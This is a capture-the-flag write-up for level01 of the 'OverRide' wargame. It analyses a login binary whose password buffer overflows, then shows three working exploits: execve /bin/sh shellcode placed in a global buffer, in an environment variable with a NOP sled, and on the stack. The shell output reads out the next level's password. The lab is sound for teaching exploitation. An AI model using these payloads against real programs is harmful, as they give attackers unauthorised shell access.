The program starts by asking for a username, which will be checked with the `verify_user_name()` function. This username must be "dat_wil":

```c
bool verify_user_name(void)
{
  puts("verifying username....\n");
  return memcmp(a_user_name, "dat_wil", 7u) != 0;
}

int main(int argc, char** argv, char** envp)
{
		//...
    fgets(&a_user_name, 256, stdin);
    int ret;
    if (verify_user_name() != 0)
    {
        puts("nope, incorrect username...\n");
        ret = 1;
    }
		//...
    return ret;
}
```


Next, the program asks for a password, which is artificially checked with the `verify_user_pass()` function, but it doesn't matter since no matter the result, "nope, incorrect password..." will be displayed:
```c
 bool verify_user_pass(const void *a1)
{
  return memcmp(a1, "admin", 5u) != 0;
}

int main(int argc, char** argv, char** envp)
{
    char buffer[64];
		//...
    else
    {
        puts("Enter Password: ");
        fgets(&buffer, 100, stdin);
        int result = verify_user_pass(&buffer);
        if ((result == 0 || result != 0))
        {
            puts("nope, incorrect password...\n");
            ret = 1;
        }
        if (result == 0)
            ret = 0;
    }
    return ret;
}
```

It can be easily observed that `fgets()` is used to read 100 characters from stdin, while the password buffer is only 64 characters in size. As this buffer is declared at the beginning of main, it seems easy to reach EIP from it.

We can overwrite EIP from an offset of 80:

```
Starting program: /home/users/level01/level01 
********* ADMIN LOGIN PROMPT *********
Enter Username: dat_wil
verifying username....

Enter Password: 
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
nope, incorrect password...

Program received signal SIGSEGV, Segmentation fault.
0x37634136 in ?? ()
```

The first buffer is in a global outside of main, so at the address: `0x804a040`
```nasm
   0x08048521 <+81>:	movl   $0x804a040,(%esp) ; <== Here is the variable
   0x08048528 <+88>:	call   0x8048370 <fgets@plt>
```

We can do `0x804a040` + 7 to account for the username "dat_wil", so `0x804a047`.
This gives us this payload:
```
(python -c 'print "dat_wil\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"'; python -c 'print "A" * 80 + "\x47\xa0\x04\x08"'; cat) | ./level01
```


And here is the flag!
```
level01@OverRide:~$ (python -c 'print "dat_wil\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"'; python -c 'print "A" * 80 + "\x47\xa0\x04\x08"'; cat) | ./level01 
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password: 
nope, incorrect password...

whoami
level02
cat /home/users/level02/.pass
PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
```

Since it's all a matter of buffer control once we can overwrite EIP at will, we might as well go through an even simpler second solution with an environment variable:

```
level01@OverRide:~$ export EXPLOIT=$(python -c 'print "\x90" * 100 + "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"')
```

It is located at this address:
```nasm
x/150s environ
...
0xffffd874:     "EXPLOIT=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\061\311\367\341Qh//shh/bin\211\343\260\v̀"
...
x/50x 0xffffd874
0xffffd874:    0x45    0x58    0x50    0x4c    0x4f    0x49    0x54    0x3d
0xffffd87c:    0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xffffd884:    0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xffffd88c:    0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xffffd894:    0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xffffd89c:    0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0xffffd8a4:    0x90    0x90
```

Let's try with `0xffffd88c`:
```
level01@OverRide:~$ (python -c 'print "dat_wil"'; python -c 'print  "A" * 80 + "\x8c\xd8\xff\xff"'; cat) | ./level01 
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password: 
nope, incorrect password...

whoami
level02
```


And here is (again) the flag!
```
cat /home/users/level02/.pass
PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
```

This technique is ultimately the simplest since it's merely necessary to know how to overwrite EIP to redirect to a buffer which is our env, we might not even need to examine the program's code.

Is that sufficient?

Of course not 🙂

We could also try to place the shellcode directly in the buffer declared in the stack! However, it's important to consider that addresses found in gdb may differ from a normal execution. As example, from gdb, we find the address `0xffffd6cc` to recover the buffer:

```nasm
   0x08048574 <+164>:	call   0x8048370 <fgets@plt>
   0x08048579 <+169>:	lea    0x1c(%esp),%eax
   0x0804857d <+173>:	mov    %eax,(%esp); <=== EAX contains the buffer's address
   0x08048580 <+176>:	call   0x80484a3 <verify_user_pass>
...
Enter Password: 
SALUT

Breakpoint 1, 0x0804857d in main ()
(gdb) x/s $eax
0xffffd6cc:     "SALUT\n"
```

Therefore, it's necessary to verify the exact location during a normal execution of the program, for example with ltrace:

```
level01@OverRide:~$ (python -c 'print "dat_wil\n" + "SALUT\n"') | ltrace ./level01 
__libc_start_main(0x80484d0, 1, -10284, 0x80485c0, 0x8048630 <unfinished ...>
puts("********* ADMIN LOGIN PROMPT ***"...********* ADMIN LOGIN PROMPT *********
)      = 39
printf("Enter Username: ")                       = 16
fgets("dat_wil\n", 256, 0xf7fcfac0)              = 0x0804a040
puts("verifying username....\n"Enter Username: verifying username....

)                 = 24
puts("Enter Password: "Enter Password: 
)                         = 17
fgets("SALUT\n", 100, 0xf7fcfac0)                = 0xffffd6ec <===== here
puts("nope, incorrect password...\n"nope, incorrect password...

)            = 29
+++ exited (status 1) +++
```

So, we will place on EIP the address of the start of our second buffer: `0xffffd6ec`

And so here is a 3rd payload and the associated flag:
```
level01@OverRide:~$ (python -c 'print "dat_wil"'; python -c 'print "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80" + "\x90" * 59 + "\xec\xd6\xff\xff"'; cat) | ./level01 
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password: 
nope, incorrect password...

whoami	
level02
cat /home/users/level02/.pass
PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
```